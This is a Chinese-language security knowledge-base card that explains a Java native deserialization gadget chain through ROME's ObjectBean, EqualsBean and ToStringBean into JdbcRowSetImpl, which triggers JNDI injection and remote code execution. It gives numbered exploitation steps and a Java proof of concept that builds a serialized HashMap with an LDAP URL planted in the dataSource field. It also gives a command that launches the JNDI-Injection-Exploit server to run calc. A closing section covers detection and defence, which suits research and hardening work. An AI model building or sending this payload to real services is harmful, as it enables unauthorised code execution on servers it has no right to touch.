---
id: web-java-deser-rome-objectbean-jdbcrowset-jndi
title: ROME ToStringBean 反射 JdbcRowSetImpl.getDatabaseMetaData 触发 JNDI 注入（HashMap/ObjectBean 入口）
type: scenario
domain: web
path: web/java/deserialization
technique: rome-objectbean-jdbcrowset-jndi
tags:
- java
- deserialization
- gadget
- rome
- jndi
- jdbcrowsetimpl
- objectbean
- equalsbean
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V606
  verified_at: '2026-11-12T18:35:54+08:00'
  notes: 已对照原文第8节与图15/16核对：ToStringBean(JdbcRowSetImpl.class, jdbcRowSet) 反射 getDatabaseMetaData→connect→InitialContext.lookup(getDataSourceName())，dataSource 字段设为 ldap://127.0.0.1:1389/nils4f、JNDI-Injection-Exploit 启动命令均与原文一致。dedup 与 fastjson AutoType 入口、Hessian/Dubbo Hessian 入口的 JdbcRowSetImpl JNDI sink 不同入口不同对象图，非同链（库内已有 Hessian 两入口分卡的先例）。原文仅第3节写环境依赖 rome 1.0，未声明受影响版本/区间，affected_versions 已 --clear。PoC 未在本机执行。
url: /docs/web/java/deserialization/web-java-deser-rome-objectbean-jdbcrowset-jndi/
draft: false
kb_aliases:
- Rome JNDI 链
- Rome JdbcRowSetImpl
- ObjectBean JNDI
- EqualsBean ToStringBean JNDI
- rome jndi lookup
---

## 一句话结论

classpath 含 rome 1.0 时，把 `ObjectBean` 作为 `HashMap` 的 key：`HashMap.readObject` 重算 hash 调用 `ObjectBean.hashCode`，经 `EqualsBean.beanHashCode → _obj.toString()` 进入 `ToStringBean` 的反射 getter 逻辑；把 `_beanClass` 设为 `JdbcRowSetImpl.class`、`_obj` 设为 `dataSource` 字段可控的 `JdbcRowSetImpl`，getter 遍历会调用 `getDatabaseMetaData() → connect() → InitialContext.lookup(getDataSourceName())`，`dataSource` 指向攻击者 LDAP/RMI 服务即完成 JNDI 注入与远程代码执行。

## 原理

- **ObjectBean 的 hashCode 转接**：`ObjectBean(beanClass, obj)` 构造时创建 `_equalsBean = new EqualsBean(beanClass, obj)`、`_toStringBean = new ToStringBean(beanClass, obj)`、`_cloneableBean = new CloneableBean(obj, ignoreProperties)`；`ObjectBean.hashCode()` 返回 `_equalsBean.beanHashCode()`，而 `EqualsBean.beanHashCode()` 是 `this._obj.toString().hashCode()`，因此 `_equalsBean._obj` 必须是一个 `ToStringBean`（构造时 beanClass 传 `ToStringBean.class`）。
- **HashMap 触发**：`HashMap.readObject` 对每个键值执行 `putVal(hash(key), ...)`，`hash` 调用 `key.hashCode()`，即触发上述 ObjectBean→EqualsBean→ToStringBean 链。原文把 `_toStringBean`、`_cloneableBean` 置 null，只保留 `_equalsBean` 参与序列化。
- **ToStringBean 反射 getter**：`toString(prefix)` 用 `BeanIntrospector.getPropertyDescriptors(this._beanClass)` 取属性描述符，对每个无参 read 方法执行 `pReadMethod.invoke(this._obj, NO_PARAMS)`。把 `_beanClass` 设为 `JdbcRowSetImpl.class`、`_obj` 设为 `JdbcRowSetImpl` 实例后，遍历会调用其 `getDatabaseMetaData()`。
- **JNDI sink**：`JdbcRowSetImpl.getDatabaseMetaData()` 调用 `connect()`；`connect()` 在 `conn == null` 且 `getDataSourceName() != null` 时执行 `new InitialContext().lookup(this.getDataSourceName())`。`getDataSourceName()` 读取 `BaseRowSet.dataSource` 字段，因此攻击者把该字段设为 `ldap://attacker:1389/xxx` 即可让服务端发起 JNDI lookup。
- **为什么成立**：Rome 把 toString 变成任意无参 getter 调用；`JdbcRowSetImpl` 的 getter 按 JDBC 设计需要在首次取元数据时建立连接，而它使用 JNDI 名称查找 DataSource；两者组合后，反序列化阶段的 hashCode 计算就会产生出站 JNDI 请求。
- **为什么用 ObjectBean 而不是直接 EqualsBean**：两者等价，ObjectBean 多一层 hashCode 转接，是常见 gadget 形态（等价写法可直接把 `EqualsBean(ToStringBean.class, toStringBean)` 放进 HashMap，或把容器换成 Hashtable）。

## 触发条件

- 存在 Java 原生反序列化入口，攻击者可控序列化流。
- classpath 含 rome 1.0（`com.sun.syndication.feed.impl.ObjectBean/EqualsBean/ToStringBean`）。
- JDK 提供 `com.sun.rowset.JdbcRowSetImpl`（JDK 8 环境最常见），且 `BaseRowSet.dataSource` 可反射写入。
- 目标可出网访问攻击者的 LDAP/RMI 服务；JDK 允许远程 codebase（8u191 以下最直接），高版本需本地 factory、序列化回包或其它 JNDI 绕过手法。
- 反序列化过滤器未拦截 Rome Bean 类与 `JdbcRowSetImpl`。

## 利用步骤

1. 启动恶意 LDAP/RMI 服务并准备可加载的工厂类/回包（原文使用 JNDI-Injection-Exploit 生成 ldap/rmi 地址，命令为 `-C calc -A 127.0.0.1` 形式）。
2. `new JdbcRowSetImpl()`，反射把 `BaseRowSet` 的 `dataSource` 字段设为 `ldap://<attacker>:1389/<name>`。
3. `new ToStringBean(JdbcRowSetImpl.class, jdbcRowSet)`；`new ObjectBean(ToStringBean.class, toStringBean)`；可把 ObjectBean 的 `_toStringBean`、`_cloneableBean` 置 null 精简对象图。
4. `HashMap.put(objectBean, "bbbb")`，序列化后发送到目标入口。
5. 目标 `readObject` 计算 key hash → `ObjectBean.hashCode → EqualsBean.beanHashCode → ToStringBean.toString → JdbcRowSetImpl.getDatabaseMetaData → connect → InitialContext.lookup`；LDAP 返回恶意 Reference/类，目标加载并执行。
6. 验证：本地反序列化观察 LDAP 回连与命令执行；若失败，检查 `dataSource` 字段、出网、JDK 的 trustURLCodebase 设置与过滤器。

## PoC

```java
// 关键构造（省略序列化与 setField 辅助方法；未在本机复跑）
String url = "ldap://127.0.0.1:1389/nils4f";

JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
Field dataSource = BaseRowSet.class.getDeclaredField("dataSource");
dataSource.setAccessible(true);
dataSource.set(jdbcRowSet, url);

ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class, jdbcRowSet);
ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);
setField(objectBean, "_toStringBean", null);
setField(objectBean, "_cloneableBean", null);

HashMap<Object, Object> map = new HashMap<>();
map.put(objectBean, "bbbb");

try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("jndi.ser"))) {
    oos.writeObject(map);
}
```

```bash
# 生成并监听 LDAP/RMI 服务（示例工具，按实际版本使用）
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C calc -A 127.0.0.1
```

## 变体与关联

- [[web-java-deser-rome-equalsbean-tostringbean-templatesimpl]]：同一上游 ObjectBean/EqualsBean→ToStringBean 链，下游换成 `TemplatesImpl.getOutputProperties` 加载本地字节码；本卡下游是 JNDI，需要出网。
- [[web-java-deser-rome-spring-hotswappable-xstring-tostringbean-templatesimpl]]：同一 ToStringBean 下游家族的另一入口（Spring `HotSwappableTargetSource` + `XString.equals`）。
- [[web-java-deser-hessian-jndi-outbound-chains]] 与 [[web-java-deser-hessian-dubbo-provider-argument-deserialization-rce]]：同样是 Rome→`JdbcRowSetImpl` JNDI 的对象图，但入口分别是 Hessian 的 `map.put` 与 Dubbo RPC 参数解码；本卡是 Java 原生 `HashMap.readObject` 入口。
- [[web-java-deser-fastjson-jdbc-rowset]]：同一 `JdbcRowSetImpl` JNDI sink 的 fastjson AutoType 入口。
- 变体：入口类可换 `EqualsBean` 直接作 key，容器可换 `Hashtable`（`reconstitutionPut` 同样调用 `key.hashCode()`）；`_beanClass` 可用接口收窄 getter；JNDI 地址可换 RMI，或用本地 factory/序列化数据绕过 JDK 高版本限制。
- 边界：目标不出网、JDK 已禁用远程 codebase、过滤器拦截 Rome 或 `JdbcRowSetImpl` 时链断；`dataSource` 为空则 `connect()` 不会 lookup。

## 检测与防御

- 检测：序列化流中同时出现 `com.sun.syndication.feed.impl.ObjectBean/EqualsBean/ToStringBean` 与 `com.sun.rowset.JdbcRowSetImpl`、`javax.naming.InitialContext`；服务端出现异常的 LDAP/RMI 出站（1389/1099 等）与 JNDI 相关错误日志。
- 防御：JEP 290 类白名单，拒绝 Rome Bean 与 `JdbcRowSetImpl` 等非业务类；移除不必要的 rome 依赖；限制服务端出站 LDAP/RMI/HTTP；JDK 升级到 8u191+ 并保持 `com.sun.jndi.ldap.object.trustURLCodebase=false`。
- 响应：保留原始序列化流与网络日志，确认是否发生远程类加载/命令执行，排查同入口其它 gadget。
